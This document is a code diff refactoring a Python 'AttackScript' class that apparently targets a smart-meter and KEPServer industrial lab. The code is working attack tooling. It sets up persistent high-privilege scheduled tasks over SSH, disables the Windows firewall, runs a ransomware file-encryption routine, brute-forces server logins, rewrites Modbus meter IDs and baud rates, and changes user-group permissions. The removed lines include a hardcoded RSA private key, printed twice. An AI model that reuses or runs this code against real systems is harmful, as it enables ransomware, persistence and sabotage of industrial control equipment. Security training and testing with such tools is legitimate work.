@@ -1,14 +1,10 @@
-from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
-import subprocess
-from psutil import process_iter
-import signal
+from os import walk, path, remove, scandir, urandom
 import base64
 from pathlib import Path
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
-from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
-from sys import executable, argv
+from subprocess import run, CalledProcessError, PIPE
 from time import sleep
 import kepconfig
 from kepconfig import connection, admin, connectivity, datalogger
@@ -49,13 +45,11 @@ class AttackScript:
         self.SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"
 
         # Path for the Modpoll
-        # TODO: Either a modpoll path finder or make a modpoll unpacker
         # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
         self.MODPOLL_PATH = "C:\\Users\\Student"
 
-        # Path for generating exe with docker pyinstaller
+        # Path for generating EXE
         self.SCRIPT_NAME = path.basename(__file__)
-        self.REQUIREMENTS_FILE = 'requirements.txt'
 
     ###########
     # ATTACKS #
@@ -146,14 +140,14 @@ class AttackScript:
         else:
             check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")
 
-            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
+            if (self.SCRIPT_NAME.rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
                 # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
                 if platform.system() != "Windows":
                     raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
                 
                 self.transfer_exe_remotely()
 
-            executable_file_path = f"{self.MODPOLL_PATH}\\{path.basename(__file__).rsplit('.', 1)[0]}.exe"
+            executable_file_path = f"{self.MODPOLL_PATH}\\{self.SCRIPT_NAME.rsplit('.', 1)[0]}.exe"
 
             executable_file_parameters = '1'
 
@@ -186,10 +180,6 @@ class AttackScript:
                     print("Fail.")
                 return
 
-            # TODO: Run a native command prompt with task scheduler without cmd window appearing
-            # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
-
-            # sch1 = f'schtasks /create /tn "{task_name1}" /tr "cmd /c \"{executable_file_path} {executable_file_parameters}\"" /sc minute /mo 1 /f /rl HIGHEST'
             sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
             sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
             command_output_1 = self.ssh_run_command(sch1)
@@ -197,33 +187,6 @@ class AttackScript:
             print(command_output_1)
             print(command_output_2)
             print("\nOk.\n")
-
-    def create_scheduled_task(self) -> None:
-        """
-        Creates scheduled task in windows to execute the AttackScript.exe every minute.
-
-        # TODO: Add comments on how frequent the schtasks run.
-        # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is useless.
-        # TODO: Self pyinstaller itself and then unpack the exe remotely and run itself with task scheduler.
-        """
-        try:
-            executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
-
-            executable_file_parameters = '1'
-
-            task_name1 = 'Smart Meter Testing'
-            task_name2 = 'Smart Meter Testing 2'
-
-            sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
-            sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
-            # TODO: Test if the task scheduler works.
-            command_output_1 = self.ssh_run_command(sch1)
-            command_output_2 = self.ssh_run_command(sch2)
-            print(command_output_1); print(command_output_2)
-            print("\nOk.\n")
-        except Exception as e:
-            print(e)
-            print("\nFail.\n")
 
     # Copy files from a folder to the shared directory
     def copy_file(self, folder_path):
@@ -249,7 +212,6 @@ class AttackScript:
         if revert:
             able = "Enabled"
             command_output = self.ssh_run_command("netsh advfirewall set allprofiles state on")
-        # cp = run('netsh advfirewall set allprofiles state off', stdout=PIPE, shell=True)
         else:
             command_output = self.ssh_run_command("netsh advfirewall set allprofiles state off")
 
@@ -376,7 +338,7 @@ class AttackScript:
     def Ransom(self, revert: bool=False) -> None:
 
         full_path_remote = "C:\\Users\\Student\\Documents\\"
-        executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
+        executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
 
         if revert:
             decrypt = ""
@@ -384,8 +346,8 @@ class AttackScript:
             print(decrypt)
             return 
 
-        # Check Linux
-        if platform.system() == "Linux":
+        # Check Linux and Check macOS
+        if platform.system() in ["Linux", "Darwin"]:
             print("Not allowed to compile with current platform")
             check_exe = self.ssh_run_command("dir " + full_path_remote + executable_name)
             print(check_exe)
@@ -400,59 +362,8 @@ class AttackScript:
         elif platform.system() == "Windows":
             output = self.transfer_exe_remotely(full_path_remote)
             print(output)
+            run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
             print(run_exe)
-
-        # Check macOS
-        elif platform.system() == "Darwin":
-            print("Not allowed to compile with current platform")
-            check_exe = self.ssh_run_command("dir " + full_path_remote + executable_name)
-            print(check_exe)
-            if executable_name in check_exe:
-                print("Previously injected executable exist on remote system, Running ransom encryption")  
-                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
-                print(run_exe)
-            else:
-                raise Exception("Invalid Platform")
-
-    # def build_executable(self) -> None:
-    #     executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
-    #     # Step 1: Create a Dockerfile
-    #     dockerfile_content = f'''
-    #     FROM python:3.12.0b3-windowsservercore-ltsc2022
-
-    #     WORKDIR /src
-
-    #     COPY {self.REQUIREMENTS_FILE} .
-
-    #     RUN pip install --no-cache-dir -r {self.REQUIREMENTS_FILE}
-
-    #     COPY . .
-    #     '''
-
-    #     with open('Dockerfile', 'w') as dockerfile:
-    #         dockerfile.write(dockerfile_content)
-
-    #     # Step 2: Build the Docker image
-    #     subprocess.run('docker build -t pyinstallertest .', shell=True)
-
-    #     # # Step 3: Remove the existing container if it exists
-    #     # subprocess.run('docker rm -f generateEXEWindows', shell=True)
-
-    #     #  # Step 4: Run the Docker container
-    #     # subprocess.run(f'docker run -v "$(pwd):/src/" --name generateEXEWindows engineervix/pyinstaller-windows', shell=True)
-        
-    #     executable_path = path.join('dist', self.SCRIPT_NAME.split('.')[0])
-    #     return executable_path
-
-    # def TEST(self) -> None:
-    #     print("THIS WORKS? MAYBE")
-    #     print(path.basename(__file__))
-    #     # full_path_remote = "C:\\Users\\Student\\Documents\\"
-    #     # executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
-
-
-    #     # run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
-    #     # print(run_exe)
 
     def revert_decrypt(self) -> None:
         privatekey = '''-----BEGIN RSA PRIVATE KEY-----
@@ -498,7 +409,6 @@ class AttackScript:
         except Exception as e:
             print("Decryption Failed.\nFail.\n")
             return
-
 
     def encrypt_files(self) -> None:
         # public key
@@ -639,7 +549,6 @@ class AttackScript:
         
         parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", current_meterID, "-1", "-r", "201", "COM1", meterID_to_change]
 
-        # FIXME: Try except for running the executable is gone
         modpoll_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
         print(modpoll_output)
 
@@ -691,8 +600,7 @@ class AttackScript:
         for username in usernames:
             for password in passwords:
                 print("Trying Username: " + username + ", Trying Password: " + password)
-                # Read and print each line in the file
-                # BUG: Why open KEPServerProperties? And also need to keep the kepserverproperties log somewhere, not in the local server.
+            
                 try:
                     server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username, pw=password)
                     output = server.get_project_properties()
@@ -723,7 +631,7 @@ class AttackScript:
         # Use current_baudrate value to set the new baudrate value in parameters list
         new_baudrate = None
         identifyBR = None
-        ##TODO: Add try catch for the if statement
+       
         if current_baudrate == "4800" or revert: # If revert, set new baudrate to 9600
             new_baudrate = "1"
             identifyBR = "9600"
@@ -766,7 +674,6 @@ class AttackScript:
             else:
                 print(f"Baudrate is not {baudrate}\n")
 
-        # NOTE: The kep_server_start() is removed as commands using this function will try to start KEPServer anyways
         if found_baudrate != "0":
             return found_baudrate
         else:
@@ -808,434 +715,6 @@ class AttackScript:
             raise Exception("Unable to connect to the SmartMeter")
 
         return
-
-    # TODO: REVERT THIS THING PAIN.
-    def revert(self, revert_option):
-        # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
-        global comPort
-        if revert_option == "1":
-            cp = run('netsh advfirewall set allprofiles state on', stdout=PIPE, shell=True)
-            if cp.stdout.decode('utf-8').strip() == "Ok.":
-                print("Firewall enabled successfully.\nOk.\n")
-            else:
-                print("Firewall failed to enable.\nFail.\n")
-
-        elif revert_option == "2":
-            count = 0
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
-            else:
-                print("Inbound Firewall Not Removed (TCP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
-            else:
-                print("Inbound Firewall Not Removed (UDP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
-            else:
-                print("Outbound Firewall Not Removed (TCP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
-            else:
-                print("Outbound Firewall Not Removed (UDP/22)")
-
-            service_name = "sshd"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]))
-            else:
-                print("The " + output[1] + " service is " + output[9])
-                count += 1
-
-            if count == 5:
-                print("Revert Success.\nOk.\n")
-            else:
-                print("Revert Fail.\nFail.\n")
-
-        elif revert_option == "3":
-
-            process_name = "modpoll"
-            pid = 0
-
-            for proc in process_iter():
-                if process_name in proc.name():
-                    pid = proc.pid
-                break
-            if pid == 0:
-                print("Modpoll not running.")
-            else:
-                kill(pid, signal.SIGTERM)
-                print("Modpoll pid:", pid, "has stopped.")
-
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-            else:
-                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
-        elif revert_option == "4":
-            cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"], stdout=PIPE, shell=True)
-            dump = cp.stdout.split()
-            deviceID = ""
-            deviceArr = []
-            for i in range(0, len(dump)):
-                if dump[i].decode("utf-8") == "ID:":
-                    deviceID = dump[i + 1].decode("utf-8")
-                    if "CVBCx196117" in deviceID:
-                        comPort = deviceID
-            batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
-            with open("script.bat", "w") as f:
-                f.write(batchscript)
-            cp = run(["script.bat"], stdout=PIPE, shell=True)
-            if "successfully" in cp.stdout.decode('utf-8'):
-                print(cp.stdout.decode('utf-8') + "\nOk.\n")
-            else:
-                print("Device not enabled. \nFail.\n")
-            remove("script.bat")
-
-        elif revert_option == "5":
-            privatekey = '''-----BEGIN RSA PRIVATE KEY-----
-    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
-    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
-    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
-    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
-    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
-    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
-    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
-    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
-    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
-    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
-    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
-    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
-    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
-    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
-    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
-    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
-    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
-    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
-    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
-    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
-    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
-    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
-    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
-    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
-    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
-    -----END RSA PRIVATE KEY-----'''
-
-            # exclude extensions
-            excludeExtension = ['.py', '.pem', '.exe']
-
-            try:
-                for item in self.recurseFiles(self.SMARTMETER_PATH, 'deleteme'):
-                    filePath = Path(item)
-                    fileType = filePath.suffix.lower()
-
-                    if fileType in excludeExtension:
-                        continue
-                    self.decrypt(filePath, privatekey)
-                print("Decryption Successful.\nOk.\n")
-            except Exception as e:
-                print("Decryption Failed.\nFail.\n")
-
-        elif revert_option == "6":
-
-            netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-            if "RUNNING" in netshare.stdout:
-                print("Kepserver is running, Stopping now.")
-                service_name = "KEPServerEXV6"
-                cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
-                output = cp.stdout.decode('utf-8').strip().split()
-                if "FAILED" in cp.stdout.decode('utf-8'):
-                    print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-                else:
-                    print("The " + output[1] + " service is " + output[9])
-                    sleep(15)
-
-            current_directory = getcwd()
-            executable_path = current_directory + "\\modpoll.exe"
-            parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
-            try:
-                check_call([executable_path] + parameters)
-            except CalledProcessError as e:
-                print("Error executing the executable file:", e)
-                print("Fail.\n")
-
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-            else:
-                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
-        elif revert_option == "7":
-            process_name = "modpoll"
-            pid = 0
-
-            for proc in process_iter():
-                if process_name in proc.name():
-                    pid = proc.pid
-                break
-            if pid == 0:
-                print("Modpoll not running.\nFail.\n")
-            else:
-                kill(pid, signal.SIGTERM)
-                print("Modpoll pid:", pid, "has stopped. \nOk.\n")
-
-        elif revert_option == "8":
-
-            for root, dirs, files in walk(self.COPIED_PATH):
-                for file in files:
-                    og = path.join(root, file)
-                    remove(og)
-                    print("File: " + str(og) + " is deleted")
-
-            if path.exists(self.COPIED_PATH):
-                rmdir(self.COPIED_PATH)
-                print(self.COPIED_PATH + " has beeen removed.")
-
-            netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-
-            task_name1 = 'Smart Meter Testing'
-            task_name2 = 'Smart Meter Testing 2'
-
-            schtaskschk = run(['schtasks', '/query', '/tn', '\"' + task_name1 + '\"'], stdout=PIPE, stderr=PIPE,
-                              text=True)
-
-            # Define the command to delete the task using schtasks
-            schdel = f'schtasks /delete /tn "{task_name1}" /f'
-            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
-
-            # Delete the task using the schtasks command
-            call(schdel, shell=True)
-            call(schdel2, shell=True)
-
-            if "SmartMeterfolder" in netsharechk.stdout:
-                call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
-
-            print("Ok.")
-
-        elif revert_option == "9":
-
-            # Stop Modpoll.exe
-            print("\n==================================\n")
-
-            process_name = "modpoll"
-            pid = 0
-
-            for proc in process_iter():
-                if process_name in proc.name():
-                    pid = proc.pid
-                break
-            if pid == 0:
-                print("Modpoll not running.")
-            else:
-                kill(pid, signal.SIGTERM)
-                print("Modpoll pid:", pid, "has stopped.")
-
-            # Enable sshd service
-            print("\n==================================\n")
-
-            service_name = "sshd"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]))
-            else:
-                print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
-            # Revert Meter25 ID to 25
-            print("\n==================================\n")
-
-            netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-            if "RUNNING" in netshare.stdout:
-                print("Kepserver is running, Stopping now.")
-                service_name = "KEPServerEXV6"
-                cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
-                output = cp.stdout.decode('utf-8').strip().split()
-                if "FAILED" in cp.stdout.decode('utf-8'):
-                    print("FAILED: " + " ".join(output[4:]))
-                else:
-                    print("The " + output[1] + " service is " + output[9])
-                    sleep(15)
-
-            current_directory = getcwd()
-            executable_path = current_directory + "\\modpoll.exe"
-            parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "26", "-r", "201", "COM1", "25"]
-            try:
-                check_call([executable_path] + parameters)
-            except CalledProcessError as e:
-                print("Error executing the executable file:", e)
-
-            # Re-Enable Firewall
-            print("\n==================================\n")
-
-            cp = run('netsh advfirewall set allprofiles state on', stdout=PIPE, shell=True)
-            if cp.stdout.decode('utf-8').strip() == "Ok.":
-                print("Revert Firewall diasble successful.")
-            else:
-                print("Revert Firewall diasble failed.")
-
-            # Remove Firewall In/Outbound rules added.
-            print("\n==================================\n")
-            count = 0
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
-            else:
-                print("Inbound Firewall Not Removed (TCP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
-            else:
-                print("Inbound Firewall Not Removed (UDP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
-            else:
-                print("Outbound Firewall Not Removed (TCP/22)")
-            cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
-            if "Ok." in cp.stdout.decode('utf-8'):
-                count += 1
-                print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
-            else:
-                print("Outbound Firewall Not Removed (UDP/22)")
-
-            if count == 4:
-                print("Revert Firewall Rules Success.")
-            else:
-                print("Revert Firewall Rules Fail.")
-
-            # Start Kepserver service
-            print("\n==================================\n")
-
-            service_name = "KEPServerEXV6"
-            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-            output = cp.stdout.decode('utf-8').strip().split()
-            if "FAILED" in cp.stdout.decode('utf-8'):
-                print("FAILED: " + " ".join(output[4:]))
-            else:
-                print("The " + output[1] + " service is " + output[9])
-
-            # Enable COM port
-            print("\n==================================\n")
-
-            cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"], stdout=PIPE, shell=True)
-            dump = cp.stdout.split()
-            deviceID = ""
-            deviceArr = []
-            for i in range(0, len(dump)):
-                if dump[i].decode("utf-8") == "ID:":
-                    deviceID = dump[i + 1].decode("utf-8")
-                    if "CVBCx196117" in deviceID:
-                        comPort = deviceID
-            batchscript = "\"C:\\Windows\\System32\\pnputil.exe\" \"/enable-device\" \"" + comPort + "\""
-            with open("script.bat", "w") as f:
-                f.write(batchscript)
-            cp = run(["script.bat"], stdout=PIPE, shell=True)
-            print(cp.stdout.decode('utf-8'))
-            remove("script.bat")
-
-            # Decrypt Files
-            print("\n==================================\n")
-
-            privatekey = '''-----BEGIN RSA PRIVATE KEY-----
-        MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
-        IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
-        rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
-        QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
-        bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
-        0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
-        vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
-        BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
-        K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
-        eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
-        wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
-        pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
-        2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
-        J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
-        hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
-        67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
-        2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
-        uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
-        dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
-        fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
-        bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
-        MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
-        YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
-        QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
-        zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
-        -----END RSA PRIVATE KEY-----'''
-
-            excludeExtension = ['.py', '.pem', '.exe']
-
-            try:
-                for item in self.recurseFiles(self.SMARTMETER_PATH, 'deleteme'):
-                    filePath = Path(item)
-                    fileType = filePath.suffix.lower()
-
-                    if fileType in excludeExtension:
-                        continue
-                    self.decrypt(filePath, privatekey)
-                print("Decryption Successful")
-            except Exception as e:
-                print("Decryption Failed")
-
-            # Remove copied file, directory, shared file and Scheduled Task
-            print("\n==================================\n")
-
-            for root, dirs, files in walk(self.COPIED_PATH):
-                for file in files:
-                    og = path.join(root, file)
-                    remove(og)
-                    print("File: " + str(og) + " is deleted")
-
-            if path.exists(self.COPIED_PATH):
-                rmdir(self.COPIED_PATH)
-                print(self.COPIED_PATH + " has beeen removed.")
-
-            netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-
-            if "SmartMeterfolder" in netsharechk.stdout:
-                call('cmd /k "net share SmartMeterfolder /delete"', shell=True)
-
-            task_name1 = 'Smart Meter Testing'
-            task_name2 = 'Smart Meter Testing 2'
-
-            schtaskschk = run(['schtasks', '/query', '/tn', '\"' + task_name1 + '\"'], stdout=PIPE, stderr=PIPE,
-                              text=True)
-
-            # Define the command to delete the task using schtasks
-            schdel = f'schtasks /delete /tn "{task_name1}" /f'
-            schdel2 = f'schtasks /delete /tn "{task_name2}" /f'
-
-            # Delete the task using the schtasks command
-            call(schdel, shell=True)
-            call(schdel2, shell=True)
-
-            print("\n==================================\n")
-
-            print("Reverting successfull.\nOk.\n")
-
-        elif revert_option == "-h":
-            print(
-                "\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything.")
-        else:
-            print("Invalid Option! Use option \"-h\" for help!")
 
     def kep_connect(self, port: int = 57412) -> connection.server:
         print(f"IP is : {self.WINDOWS_SERVER_IP}")
@@ -1284,8 +763,7 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": description,
                                                           "libadminsettings.USERMANAGER_USER_GROUPNAME": groupname,
-                                                          "libadminsettings.USERMANAGER_USER_PASSWORD": password},
-                                                 user=user), indent=4))
+                                                          "libadminsettings.USERMANAGER_USER_PASSWORD": password}, user=user), indent=4))
 
     def kep_add_user(self, user, groupname, password):  
         server = self.kep_connect()
@@ -1330,10 +808,9 @@ class AttackScript:
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
-                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True},
-                                                  user_group=usergroup))
+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group=usergroup))
 
-    def kep_downgrade_user_group(self, usergroup):  ### ADDED to let user modify user group to superuser
+    def kep_downgrade_user_group(self, usergroup):
         server = self.kep_connect()
         print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP",
                                                            "libadminsettings.USERMANAGER_IO_TAG_READ": "Disable",
@@ -1358,8 +835,7 @@ class AttackScript:
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": False,
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": False,
                                                            "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": False,
-                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": False},
-                                                  user_group=usergroup))
